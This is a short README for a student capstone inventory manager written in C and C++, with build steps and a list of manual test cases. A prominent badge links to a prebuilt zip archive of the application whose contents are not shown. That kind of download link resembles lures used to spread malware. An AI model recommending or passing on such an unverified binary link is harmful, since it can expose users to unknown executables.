# Hybrid Inventory Manager

[![Download Latest Version](https://img.shields.io/badge/Download-Application-success?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Whitedevil964/Hybrid-Inventory-Manager/main/Downloads/HybridInventoryManager.zip)

A capstone project demonstrating a hybrid application using C for binary file storage and C++ for the presentation layer.

## Build and Run Steps

### Using CMake
1. Open a terminal in the root directory.
2. Run `cmake -B build` to generate the build files.
3. Run `cmake --build build` to compile the project.
4. Run the executable:
   - On Windows: `.\build\Debug\HybridInventoryManager.exe` (or `.\build\HybridInventoryManager.exe` depending on the generator).
   - On Linux/Mac: `./build/HybridInventoryManager`

### Using G++ directly (Alternative)
You can also build the application directly without CMake using `g++` and `gcc`:
```bash
g++ -Iinclude src/main.cpp src/InventoryManager.cpp src/inventory.c -o HybridInventoryManager
.\HybridInventoryManager
```

## Test Cases
- **Add Items:** Added 3 items (Apples, Bananas, Oranges). Restarted the application and selected "List all", verifying that all 3 items persisted.
- **Update Item:** Selected an item (e.g., Apples) and updated its price. Restarted the application and verified the price remained updated.
- **Delete Item:** Deleted an item (e.g., Bananas). It successfully disappeared from "List all" and could no longer be viewed by ID.
- **Duplicate IDs:** Attempted to add another item with the same ID as an existing item. The system correctly rejected it without crashing.
- **Invalid Inputs:** Entered negative prices, negative quantities, and blank names. The system successfully caught these invalid inputs and prompted for re-entry without crashing.
